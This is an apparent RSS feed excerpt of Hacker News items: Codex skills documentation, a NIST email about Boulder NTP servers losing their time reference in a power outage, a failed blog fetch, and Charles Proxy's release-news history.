<div data-astro-cid-cy6iooep="" data-file-tree=""> <ul role="tree" data-astro-cid-cy6iooep=""> <li data-depth="0" data-last="true" data-astro-cid-cy6iooep=""> <details open="" aria-label="my-skill/ directory" data-astro-cid-cy6iooep=""> <summary data-astro-cid-cy6iooep=""> <span data-astro-cid-cy6iooep=""> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24" data-astro-cid-cy6iooep="true"><path fill-rule="evenodd" d="M8.293 4.293a1 1 0 0 1 1.414 0l7 7a1 1 0 0 1 0 1.414l-7 7a1 1 0 0 1-1.414-1.414L14.586 12 8.293 5.707a1 1 0 0 1 0-1.414Z" clip-rule="evenodd"></path></svg> </span> <span data-astro-cid-cy6iooep=""> <span data-astro-cid-cy6iooep=""> my-skill/ </span> </span>  </summary> <div data-astro-cid-cy6iooep=""> <ul role="group" data-astro-cid-cy6iooep=""> <li data-depth="1" data-astro-cid-cy6iooep=""> <p><span data-astro-cid-cy6iooep=""> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24" data-astro-cid-cy6iooep="true"><path fill-rule="evenodd" d="M8 3.51v12.222c1.1.372 2.146 1.062 3 1.941V7.211c-.31-1.455-1.524-2.948-3-3.7Zm5 4.728v11.578c.767-.38 1.51-.68 2.287-.908 1.27-.372 2.585-.533 4.187-.558V6.514c-2.68.088-4.281.55-6.474 1.724ZM9.757 19.272c-.663-.745-1.513-1.348-2.406-1.648A1.987 1.987 0 0 1 6 15.738v-9.08a11.37 11.37 0 0 0-1.535-.143h-.004l-.002.001-.004.002V18.35c2.105.033 3.7.303 5.3.922ZM6 4.635V3.512c0-1.411 1.495-2.493 2.866-1.805 1.742.873 3.269 2.533 3.901 4.402 2.119-1.046 3.93-1.506 6.658-1.594 1.142-.037 2.05.895 2.05 1.999v11.837a1.996 1.996 0 0 1-1.96 1.999c-1.485.022-2.614.17-3.666.477-1.055.31-2.079.792-3.342 1.535a1 1 0 0 1-1.014 0c-2.465-1.45-4.169-1.968-7.078-2.012a1.995 1.995 0 0 1-1.959-1.998V6.515c0-1.147.958-2.036 2.077-1.998.601.02 1.045.06 1.467.118Z" clip-rule="evenodd"></path></svg> </span> <span data-astro-cid-cy6iooep=""> <span data-astro-cid-cy6iooep=""> SKILL.md </span> </span> <span data-astro-cid-cy6iooep=""> Required: instructions + metadata </span> </p> </li><li data-depth="1" data-astro-cid-cy6iooep=""> <p><span data-astro-cid-cy6iooep=""> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24" data-astro-cid-cy6iooep="true"><path fill-rule="evenodd" d="M2 6a3 3 0 0 1 3-3h4.172a3 3 0 0 1 2.12.879l.83.828a1 1 0 0 0 .706.293H19a3 3 0 0 1 3 3v10a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V6Zm3-1a1 1 0 0 0-1 1v4h16V8a1 1 0 0 0-1-1h-6.172a3 3 0 0 1-2.12-.879l-.83-.828A1 1 0 0 0 9.173 5H5Zm15 7H4v6a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-6Z" clip-rule="evenodd"></path></svg> </span> <span data-astro-cid-cy6iooep=""> <span data-astro-cid-cy6iooep=""> scripts/ </span> </span> <span data-astro-cid-cy6iooep=""> Optional: executable code </span> </p> </li><li data-depth="1" data-astro-cid-cy6iooep=""> <p><span data-astro-cid-cy6iooep=""> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24" data-astro-cid-cy6iooep="true"><path fill-rule="evenodd" d="M2 6a3 3 0 0 1 3-3h4.172a3 3 0 0 1 2.12.879l.83.828a1 1 0 0 0 .706.293H19a3 3 0 0 1 3 3v10a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V6Zm3-1a1 1 0 0 0-1 1v4h16V8a1 1 0 0 0-1-1h-6.172a3 3 0 0 1-2.12-.879l-.83-.828A1 1 0 0 0 9.173 5H5Zm15 7H4v6a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-6Z" clip-rule="evenodd"></path></svg> </span> <span data-astro-cid-cy6iooep=""> <span data-astro-cid-cy6iooep=""> references/ </span> </span> <span data-astro-cid-cy6iooep=""> Optional: documentation </span> </p> </li><li data-depth="1" data-last="true" data-astro-cid-cy6iooep=""> <p><span data-astro-cid-cy6iooep=""> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24" data-astro-cid-cy6iooep="true"><path fill-rule="evenodd" d="M2 6a3 3 0 0 1 3-3h4.172a3 3 0 0 1 2.12.879l.83.828a1 1 0 0 0 .706.293H19a3 3 0 0 1 3 3v10a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V6Zm3-1a1 1 0 0 0-1 1v4h16V8a1 1 0 0 0-1-1h-6.172a3 3 0 0 1-2.12-.879l-.83-.828A1 1 0 0 0 9.173 5H5Zm15 7H4v6a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-6Z" clip-rule="evenodd"></path></svg> </span> <span data-astro-cid-cy6iooep=""> <span data-astro-cid-cy6iooep=""> assets/ </span> </span> <span data-astro-cid-cy6iooep=""> Optional: templates, resources </span> </p> </li> </ul> </div> </details> </li> </ul> </div> 
<p>Skills use <strong>progressive disclosure</strong> to manage context efficiently. At startup, Codex loads the name and description of each available skill. Codex can then activate and use a skill in two ways:</p>
<ol>
<li><strong>Explicit invocation:</strong> You can include skills directly as part of your prompt. To select one, run the <code>/skills</code> slash command, or start typing <code>$</code> to mention a skill. (Codex web and iOS don’t support explicit invocation yet, but you can still prompt Codex to use any skill checked into the repo.)</li>
</ol>

<ol start="2">
<li><strong>Implicit invocation:</strong> Codex can decide to use an available skill when the user’s task matches the skill’s description.</li>
</ol>
<p>In either method, Codex reads the full instructions of the invoked skills and any extra references checked into the skill.</p>

<p>Codex loads skills from these locations. A skill’s location defines its scope.</p>
<p>When Codex loads available skills from these locations, it overwrites skills with the same name from a scope of lower precedence. The list below shows skill scopes and locations in order of precedence (high to low):</p>








































<div><table><thead><tr><th>Skill Scope</th><th>Location</th><th>Suggested Use</th></tr></thead><tbody><tr><td><code>REPO</code></td><td><code>$CWD/.codex/skills</code> <br> Current Working Directory: where you launch Codex.</td><td>If in a repository or code environment, teams can check in skills most relevant to a working folder here. For instance, skills only relevant to a microservice or a code module.</td></tr><tr><td><code>REPO</code></td><td><code>$CWD/../.codex/skills</code> <br> A folder above CWD when you launch Codex inside a git repository.</td><td>If in a repository with nested folders, organizations can check in skills most relevant to a shared area in a parent folder.</td></tr><tr><td><code>REPO</code></td><td><code>$REPO_ROOT/.codex/skills</code> <br> The top-most root folder when you launch Codex inside a git repository.</td><td>If in a repository with nested folders, organizations can check in skills that are relevant to everyone using the repository. These serve as root skills that any subfolder in the repository can overwrite.</td></tr><tr><td><code>USER</code></td><td><code>$CODEX_HOME/skills</code> <br> <small>(Mac/Linux default: <code>~/.codex/skills</code>)</small> <br> Any skills checked into the user’s personal folder.</td><td>Use to curate skills relevant to a user that apply to any repository the user may work in.</td></tr><tr><td><code>ADMIN</code></td><td><code>/etc/codex/skills</code> <br> Any skills checked into the machine or container in a shared, system location.</td><td>Use for SDK scripts, automation, and for checking in default admin skills available to each user on the machine.</td></tr><tr><td><code>SYSTEM</code></td><td>Bundled with Codex.</td><td>Useful skills relevant to a broad audience such as the skill-creator and plan skills. Available to everyone when they start Codex and can be overwritten by any layer above.</td></tr></tbody></table></div>

<p>To create a new skill, use the built-in <code>$skill-creator</code> skill inside Codex. Describe what you want your skill to do, and Codex will start bootstrapping your skill. If you combine it with the <code>$plan</code> skill, Codex will first create a plan for your skill.</p>
<p>You can also create a skill manually by creating a folder with a <code>SKILL.md</code> file inside a valid skill location. A <code>SKILL.md</code> must contain a <code>name</code> and <code>description</code> to help Codex select the skill:</p>
<pre tabindex="0" data-language="md"><code><span><span>---</span></span>
<span><span>name: skill-name</span></span>
<span><span>description: Description that helps Codex select the skill</span></span>
<span><span>metadata:</span></span>
<span><span>  short-description: Optional user-facing description</span></span>
<span><span>---</span></span>
<span></span>
<span><span>Skill instructions for the Codex agent to follow when using this skill.</span></span></code></pre>
<p>Codex skills build on the <a href="https://agentskills.io/specification">Agent Skills specification</a>. Check out the documentation to learn more.</p>

<p>To expand on the list of built-in skills, you can download skills from a <a href="https://github.com/openai/skills">curated set of skills on GitHub</a> using the <code>$skill-installer</code> skill:</p>
<pre tabindex="0" data-language="plaintext"><code><span><span>$skill-installer linear</span></span></code></pre>
<p>You can also prompt the installer to download skills from other repositories.</p>

<h3 id="plan-a-new-feature"><span>Plan a new feature</span></h3>
<p>Codex ships with a built-in <code>$plan</code> skill that’s great to have Codex research and create a plan to build a new feature or solve a complex problem.</p>
<h3 id="access-linear-context-for-codex-tasks"><span>Access Linear context for Codex tasks</span></h3>
<pre tabindex="0" data-language="plaintext"><code><span><span>$skill-installer linear</span></span></code></pre>

<h3 id="have-codex-access-notion-for-more-context"><span>Have Codex access Notion for more context</span></h3>
<pre tabindex="0" data-language="plaintext"><code><span><span>$skill-installer notion-spec-to-implementation</span></span></code></pre>
  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[NTP at NIST Boulder Has Lost Power (316 pts)]]></title>
            <link>https://lists.nanog.org/archives/list/nanog@lists.nanog.org/message/ACADD3NKOG2QRWZ56OSNNG7UIEKKTZXL/</link>
            <guid>46334299</guid>
            <pubDate>Sat, 20 Dec 2025 07:39:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lists.nanog.org/archives/list/nanog@lists.nanog.org/message/ACADD3NKOG2QRWZ56OSNNG7UIEKKTZXL/">https://lists.nanog.org/archives/list/nanog@lists.nanog.org/message/ACADD3NKOG2QRWZ56OSNNG7UIEKKTZXL/</a>, See on <a href="https://news.ycombinator.com/item?id=46334299">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="thread-content">

     <!-- /email-header: gravatar, author-info, date, peramlink, changed_subject -->
    <p>reposting from the Internet time service list


jeff.s...@nist.gov &lt;jeff.sherman@nist.gov&gt;: Dec 19 05:18PM -0800

Dear colleagues,

In short, the atomic ensemble time scale at our Boulder campus has failed
due to a prolonged utility power outage. One impact is that the Boulder
Internet Time Services no longer have an accurate time reference. At time
of writing the Boulder servers are still available due a standby power
generator, but I will attempt to disable them to avoid disseminating
incorrect time.

The affected servers are:
time-a-b.nist.gov
time-b-b.nist.gov
time-c-b.nist.gov
time-d-b.nist.gov
time-e-b.nist.gov
ntp-b.nist.gov (authenticated NTP)

No time to repair estimate is available until we regain staff access and
power. Efforts are currently focused on obtaining an alternate source of
power so the hydrogen maser clocks survive beyond their battery backups.

More details follow.

Due to prolonged high wind gusts there have been a combination of utility
power line damage and preemptive utility shutdowns (in the interest of
wildfire prevention) in the Boulder, CO area. NIST's campus lost utility
power Wednesday (Dec. 17 2025) around 22:23 UTC. At time of writing utility
power is still off to the campus. Facility operators anticipated needing to
shutdown the heat-exchange infrastructure providing air cooling to many
parts of the building, including some internal networking closets. As a
result, many of these too were preemptively shutdown with the result that
our group lacks much of the monitoring and control capabilities we
ordinarily have. Also, the site has been closed to all but emergency
personnel Thursday and Friday, and at time of writing remains closed.

At initial power loss, there was no immediate impact to the NIST atomic
time scale or distribution services because the projects are afforded
standby power generators. However, we now have strong evidence one of the
crucial generators has failed. In the downstream path is the primary signal
distribution chain, including to the Boulder Internet Time Service. Another
campus building houses additional clocks backed up by a different power
generator; if these survive it will allow us to re-align the primary time
scale when site stability returns without making use of external clocks or
reference signals.

Best wishes,
-Jeff Sherman
project email: internet-time-service@nist.gov

AnneJ (watching from Edinburgh, UK)</p>

    

    

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Privacy doesn't mean anything anymore, anonymity does (252 pts)]]></title>
            <link>https://servury.com/blog/privacy-is-marketing-anonymity-is-architecture/</link>
            <guid>46334025</guid>
            <pubDate>Sat, 20 Dec 2025 06:21:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://servury.com/blog/privacy-is-marketing-anonymity-is-architecture/">https://servury.com/blog/privacy-is-marketing-anonymity-is-architecture/</a>, See on <a href="https://news.ycombinator.com/item?id=46334025">Hacker News</a></p>
Couldn't get https://servury.com/blog/privacy-is-marketing-anonymity-is-architecture/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Charles Proxy (241 pts)]]></title>
            <link>https://www.charlesproxy.com/</link>
            <guid>46333983</guid>
            <pubDate>Sat, 20 Dec 2025 06:09:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.charlesproxy.com/">https://www.charlesproxy.com/</a>, See on <a href="https://news.ycombinator.com/item?id=46333983">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
						
							
		<dt>11 Jun 2023</dt>
	


<dd><p>Charles 5 public beta 9 is now available for testing, featuring more UI improvements and bug fixes. <span><a href="https://www.charlesproxy.com/download/beta/">Read more.</a></span></p></dd>
						
							
		<dt>11 Apr 2023</dt>
	


<dd><p>Charles 5 public beta is now available for testing, featuring major UI improvements and technology upgrades. <span><a href="https://www.charlesproxy.com/download/beta/">Read more.</a></span></p></dd>
						
							
		<dt>4 Apr 2023</dt>
	


<dd><p>Charles 4.6.4 released with macOS crash fixed and Windows code signing updated. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>26 Sep 2022</dt>
	


<dd><p>Charles 4.6.3 released with minor bug fixes and Java 11 update <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>14 Dec 2021</dt>
	


<dd><p>In light of the current log4j2 vulnerabilities, we confirm that no version of Charles shipped or used any version of log4j and Charles is therefore thankfully unaffected by this issue. Our best wishes to the log4j developers and everyone affected by this.</p></dd>
						
							
		<dt>6 Jul 2021</dt>
	


<dd><p>Charles 4.6.2 released including bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>15 Nov 2020</dt>
	


<dd><p>Charles 4.6.1 released to fix Dark Mode support on macOS <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>7 Nov 2020</dt>
	


<dd><p>Charles 4.6 released including new features and stability improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>15 Jan 2020</dt>
	


<dd><p>Charles 4.5.6 released with minor bug fixes and patched security vulnerability. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>5 Dec 2019</dt>
	


<dd><p>Charles 4.5.5 released including bug fixes for SSL certificate imports. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>3 Nov 2019</dt>
	


<dd><p>Charles 4.5.2 released including new features, bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>28 Feb 2019</dt>
	


<dd><p>Charles 4.2.8 released with minor bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>14 Sep 2018</dt>
	


<dd><p>Charles 4.2.7 released with minor bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>5 May 2018</dt>
	


<dd><p>Charles Security Bulletin for a local privilege escalation in Charles 4.2 and 3.12.1 and earlier. <span><a href="https://www.charlesproxy.com/documentation/security/">Read more.</a></span></p></dd>
						
							
		<dt>7 Apr 2018</dt>
	


<dd><p>Charles 4.2.5 released with major bug fixes and minor improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>28 Mar 2018</dt>
	


<dd><p>Charles for iOS released. <span><a href="https://www.charlesproxy.com/ios/">Read more.</a></span></p></dd>
						
							
		<dt>22 Nov 2017</dt>
	


<dd><p>Charles 4.2.1 released with important bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>30 Sep 2017</dt>
	


<dd><p>Charles 4.2 released with major new TLS debugging capability, minor improvements and bug fixes including macOS High Sierra support. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>10 Jul 2017</dt>
	


<dd><p>Charles 4.1.4 released with minor improvements and bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>20 Jun 2017</dt>
	


<dd><p>Charles 4.1.3 released including Brotli compression support and other minor bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>13 May 2017</dt>
	


<dd><p>Charles 4.1.2 released with bug fixes and minor improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>21 Apr 2017</dt>
	


<dd><p>Charles 4.1.1 released with bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>10 Apr 2017</dt>
	


<dd><p>Charles 4.1 released including major new features and bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>19 Nov 2016</dt>
	


<dd><p>Charles 4.0.2 released including bug fixes and minor improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>20 Sep 2016</dt>
	


<dd><p>Charles 4.0.1 released including bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>16 Sep 2016</dt>
	


<dd><p>Charles 3.11.6 released with support for macOS Sierra and minor bug fixes. <span><a href="https://www.charlesproxy.com/download/previous-release/">Read more.</a></span></p></dd>
						
							
		<dt>1 Aug 2016</dt>
	


<dd><p>Charles 4 released featuring HTTP 2, IPv6 and improved look and feel. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>29 May 2016</dt>
	


<dd><p>Charles 3.11.5 released including minor bug fixes; especially fixes SSL certificate installation on Android. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>29 Feb 2016</dt>
	


<dd><p>Charles 3.11.4 released with support for ATS on iOS 9 and crash fixes for older versions of Mac OS X. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>15 Feb 2016</dt>
	


<dd><p>Charles v3.11.3 released including bug fixes and minor improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>9 Nov 2015</dt>
	


<dd><p>Charles v3.11.2 released with SSL and Websockets improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>4 Oct 2015</dt>
	


<dd><p>Charles 3.11 released including major new features. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>7 Jul 2015</dt>
	


<dd><p>Charles 3.10.2 released with bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>31 Mar 2015</dt>
	


<dd><p>Charles 3.10.1 released with minor bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>21 Mar 2015</dt>
	


<dd><p>Charles 3.10 released with improved SSL (new SSL CA certificate install required), major new features and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>22 Oct 2014</dt>
	


<dd><p>Charles v3.9.3 released with improvements to SSL support, Mac OS X Yosemite support and other minor bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>26 May 2014</dt>
	


<dd><p>Charles v3.9.2 released with minor bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>5 May 2014</dt>
	


<dd><p>Charles 3.9.1 released with minor bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>25 Apr 2014</dt>
	


<dd><p>Charles 3.9 released with major new features and bug fixes, including the ability to "focus" on hosts so they are separated from the noise. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>23 Oct 2013</dt>
	


<dd><p>Charles 3.8.3 released with support for Mac OS X Mavericks and minor bug fixes. Happy Mavericks Day. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>21 Oct 2013</dt>
	


<dd><p>Charles 3.8.2 released with minor bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>9 Sep 2013</dt>
	


<dd><p>Charles 3.8.1 released with minor bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>4 Sep 2013</dt>
	


<dd><p>Charles 3.8 has been released with new features and bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>12 Feb 2013</dt>
	


<dd><p>Charles 3.7 has been released. Includes new features, bundled Java runtime (so you don’t need to install Java anymore), and bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>27 Jun 2012</dt>
	


<dd><p>Charles 3.7 beta 2 has been released. This changes the SSL signing for Charles on Mac OS X to use Apple's new Developer ID code-signing. <span><a href="http://www.charlesproxy.com/download/beta/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>8 Dec 2011</dt>
	


<dd><p>Charles v3.6.5 released including bug fixes and minor changes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>15 Nov 2011</dt>
	


<dd><p>Charles v3.6.4 released including major bug fixes and enhancements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>5 Sep 2011</dt>
	


<dd><p>Charles v3.6.3 released including minor bug fixes. <span><a href="http://www.charlesproxy.com/download/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>24 Aug 2011</dt>
	


<dd><p>Charles v3.6.1 released including minor enhancements and bug fixes. <span><a href="http://www.charlesproxy.com/download/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>18 Aug 2011</dt>
	


<dd><p>Charles v3.6 released including new features, enhancements and bug fixes. New features include HAR and SAZ file import. <span><a href="http://www.charlesproxy.com/download/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>17 Aug 2010</dt>
	


<dd><p>Charles v3.5.2 released including bug fixes and minor new features. <span><a href="http://www.charlesproxy.com/download/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>1 Jan 2010</dt>
	


<dd><p>Charles 3.5.1 released. Minor bug fixes. <span><a href="http://www.charlesproxy.com/download/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>23 Dec 2009</dt>
	


<dd><p>Charles 3.5 released. Major new features, bug fixes and enhancements.</p></dd>
						
							
		<dt>17 Oct 2009</dt>
	


<dd><p>Charles 3.4.1 released. Minor features and bug fixes.</p></dd>
						
							
		<dt>27 Sep 2009</dt>
	


<dd><p>Charles 3.4 released. Major changes especially to SSL.</p></dd>
						
							
		<dt>11 May 2009</dt>
	


<dd><p>New website launched. Follow <a href="http://twitter.com/charlesproxy" target="_blank" rel="noopener noreferrer">@charlesproxy</a> on Twitter. Say hi in San Francisco when I'm there for WWDC!</p></dd>
						
							
		<dt>7 Mar 2009</dt>
	


<dd><p>Charles 3.3.1 released. Minor new features and bug fixes. Experimental 64 bit Windows support. <span><a href="http://www.charlesproxy.com/" target="_blank" rel="noopener noreferrer">Read more.</a></span></p></dd>
						
							
		<dt>15 Feb 2009</dt>
	


<dd><p>Charles 3.3 released. Major new features. Download</p></dd>
						
							
		<dt>24 Sep 2008</dt>
	


<dd><p>Charles Autoconfiguration add-on for Mozilla Firefox adds support for Firefox 3.1</p></dd>
						
							
		<dt>23 Sep 2008</dt>
	


<dd><p>Charles 3.2.3 released. Minor new features and bug fixes.</p></dd>
						
							
		<dt>6 Sep 2008</dt>
	


<dd><p>Charles 3.2.2 released. Minor new features and bug fixes.</p></dd>
						
							
		<dt>17 Apr 2008</dt>
	


<dd><p>Charles 3.2.1 released. Minor new features and bug fixes.</p></dd>
						
							
		<dt>24 Mar 2008</dt>
	


<dd><p>Charles 3.2 released. Major new features. Release Notes</p></dd>
						
							
		<dt>28 Jan 2008</dt>
	


<dd><p>Charles 3.2 public beta released. Download and more information on my blog.</p></dd>
						
							
		<dt>19 Dec 2007</dt>
	


<dd><p>Charles 3.1.4 released. Bug fixes and minor new features.</p></dd>
						
							
		<dt>21 Nov 2007</dt>
	


<dd><p>Charles Mozilla Firefox add-on updated for compatibility with Firefox 3.0.</p></dd>
						
							
		<dt>12 Nov 2007</dt>
	


<dd><p>Charles 3.1.3 released. Minor bug fixes, minor new features.</p><ul><li>Chart tab now includes charts for sizes, durations and types</li><li>Request &amp; Response can now be displayed combined on one split-panel</li><li>SSL handshake and certificate errors are now displayed in the tree</li></ul></dd>
						
							
		<dt>29 Aug 2007</dt>
	


<dd><p>Charles 3.1.2 released. Minor bug fixes.</p></dd>
						
							
		<dt>27 Aug 2007</dt>
	


<dd><p>Charles 3.1.1 released. Minor bug fixes.</p></dd>
						
							
		<dt>13 Aug 2007</dt>
	


<dd><p>Charles 3.1 released.</p></dd>
						
							
		<dt>22 May 2007</dt>
	


<dd><p>Charles 3.0.4 released. Fixes SSL bug on Java 1.4.</p></dd>
						
							
		<dt>14 May 2007</dt>
	


<dd><p>Charles 3.0.3 re-released. Fixes launch bug on computers that haven't used Charles before.</p></dd>
						
							
		<dt>12 May 2007</dt>
	


<dd><p>Charles 3.0.3 released. Various improvements and minor bug fixes.</p></dd>
						
							
		<dt>23 Apr 2007</dt>
	


<dd><p>Charles 3.0.2 released. Minor bug fixes and improvements.</p></dd>
						
							
		<dt>28 Mar 2007</dt>
	


<dd><p>Charles 3.0.1 released. Minor bug fixes.</p></dd>
						
							
		<dt>24 Mar 2007</dt>
	


<dd><p>Charles 3.0 released. Major new features and improvements</p></dd>
						
							
		<dt>7 Mar 2007</dt>
	


<dd><p>Charles 3.0 public beta released.</p></dd>
						
							
		<dt>27 Feb 2007</dt>
	


<dd><p>Charles v2.6.4 release. Minor bug fixes:</p><ul><li>IBM JDK compatibility</li><li>Improved malformed Referer header support</li></ul></dd>
						
							
		<dt>17 Feb 2007</dt>
	


<dd><p>Charles v2.6.3 release. Minor bug fixes:</p><ul><li>Fixed Port Forwarding fault introduced in v2.6.2</li></ul></dd>
						
							
		<dt>1 Feb 2007</dt>
	


<dd><p>Charles v2.6.2 release. Major improvements and bug fixes including:</p><ul><li>No more recording limits. Large responses are now saved to temporary files, reducing memory usage.</li><li>MTU support in the throttle settings</li><li>AMF3 / Flex 2 bug fixes</li></ul></dd>
						
							
		<dt>2 Dec 2006</dt>
	


<dd><p>Charles v2.6.1 release. Minor bug fixes and improvements:</p><ul><li>SOAP information visible while response is still loading</li><li>AMF3 externalizable object parsing regression fixed</li><li>AMF view for AMF3/Flex messages simplified to hide Flex implementation details</li></ul></dd>
						
							
		<dt>27 Nov 2006</dt>
	


<dd><p>Charles v2.6 release. Major improvements and bug fixes including:</p><ul><li>Major UI overhaul</li><li>JSON and JSON-RPC support</li><li>SOAP support</li></ul></dd>
						
							
		<dt>20 Sep 2006</dt>
	


<dd><p>Charles v2.5 release. Major improvements and bug fixes including:</p><ul><li>Major UI improvements</li><li>Support for new filetypes including FLV</li><li>Major improvements to AMF / Flash remoting viewer</li><li>Thank you to everyone who made suggestions and participated in the long testing process.</li></ul></dd>
						
							
		<dt>1 Jun 2006</dt>
	


<dd><p>Charles v2.4.2 release. Minor improvements and bug fixes including:</p><ul><li>Support for request body compression (used by web services)</li><li>Fix for parsing of AMFPHP responses</li><li>Improvements to AMF viewer</li></ul></dd>
						
							
		<dt>6 May 2006</dt>
	


<dd><p>Charles v2.4.1 release. Minor improvements and bug fixes including:</p><ul><li>Firefox extension improved</li><li>AMF 0 and AMF 3 parsing improved</li><li>Look and Feel changes to give a greater (and more consistent) range of font sizes in the Charles look and feel</li><li>SSL error reporting improved when a connection cannot be made to a remote host</li><li>Port Forwarding tool and Reverse Proxy tool re-bind exception fixed</li></ul></dd>
						
							
		<dt>26 Apr 2006</dt>
	


<dd><p>Charles v2.4 release. Major new features, improvements and bug fixes including:</p><ul><li>AMF 3 support</li><li>SSL support for IBM JDK (thanks to Lance Bader for helping solve this)</li><li>Automatic Update Checking</li><li>Documentation wiki open to public</li></ul></dd>
						
							
		<dt>25 Mar 2006</dt>
	


<dd><p>Charles v2.3 release. Major improvements and bug fixes including:</p><ul><li>Proxy implementation improvements including better handling of keep-alive connections</li><li>SOCKS proxy added, so any SOCKSified application can now run through Charles</li><li>External proxies configuration improvements including authentication</li><li>Flash Remoting / AMF viewer improvements</li><li>Dynamic proxy port support, for multiuser systems</li></ul></dd>
						
							
		<dt>5 Nov 2005</dt>
	


<dd><p>Charles v2.2.1 release. Minor improvements and bug fixes including:</p><ul><li>Further improved Firefox proxy configuration</li><li>Port Forwarding enhancements including port ranges and UDP forwarding</li><li>Bug fixes for Reverse Proxy and AMF viewer</li></ul></dd>
						
							
		<dt>5 Oct 2005</dt>
	


<dd><p>Charles v2.2 released. Major enhancements and bug fixes including:</p><ul><li>Improved Firefox proxy configuration</li><li>XML viewer improvements</li><li>Line numbers displayed in ASCII viewer</li></ul></dd>
						
							
		<dt>2 Sep 2005</dt>
	


<dd><p>Charles v2.1 released. Major new features and enhancements including:</p><ul><li>Automatic Firefox proxy configuration</li><li>Formatted form posts and query string information</li><li>Parsing of SWF and AMF (Flash Remoting) binary formats</li></ul></dd>
